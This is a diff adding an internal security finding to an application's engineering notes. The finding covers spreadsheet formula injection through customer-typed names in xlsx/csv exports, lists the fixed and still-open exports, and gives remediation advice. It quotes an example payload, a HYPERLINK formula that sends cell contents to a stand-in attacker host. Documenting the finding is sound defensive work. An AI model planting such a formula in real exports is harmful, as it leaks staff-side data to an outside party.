@@ -1013,3 +1013,12 @@ reflect the waiver; the history does not survive).
 **Migration 064** adds the `suppressed` status to `notification_log`. Its downgrade refuses while any suppressed row exists; do not delete those rows, they are the record of why a customer was not messaged.
 
 **Erasing a customer is irreversible at the identity provider (2026-11-16).** `DELETE /v1/customers/{id}` deletes the customer's Cognito/Entra account and replaces their `tenant_user` email and name with placeholders. There is no undo; the row stays, deactivated, for FK integrity. If it returns `502` the provider call failed and nothing was erased; retry.
+
+## Spreadsheet formula injection in exports (2026-11-16)
+
+**Finding (MEDIUM, patch within 2 weeks): customer-typed text can run as a spreadsheet formula.** Anyone can self-register as a customer (`/register/{slug}`) and choose their own name. The single-record exports write that name, and other typed text (goods descriptions, vessel names), into the file as raw text: openpyxl turns an xlsx string that starts with `=` into a formula, and a csv cell that starts with `=`, `+`, `-` or `@` is read as one by Excel (CWE-1236). A customer registering as `=HYPERLINK("https://evil.example/?"&A2,"Click")` therefore plants a formula in any staff export that includes them.
+
+**Fixed (2026-11-16):** the two new list exports (`GET /v1/billing/export`, `GET /v1/containers/export`) write text as text (`services/excel/_tables.py`; tests in `tests/unit/test_list_exports.py`, mutation-checked).
+
+**Still open:** the older exports `export_billing.py`, `export_manifest.py`, `export_packing_list.py` and `service._rows_to_csv` (used by the customer's "Download invoice"), about fifteen text cells. The fix is to route their text cells through `_tables.py` (xlsx: force the cell type to string; csv: a leading `'`), leaving numbers and money untouched so a negative balance is not mistaken for a formula. A careless fix that quotes every leading `-` would corrupt negative amounts in the csv.
+
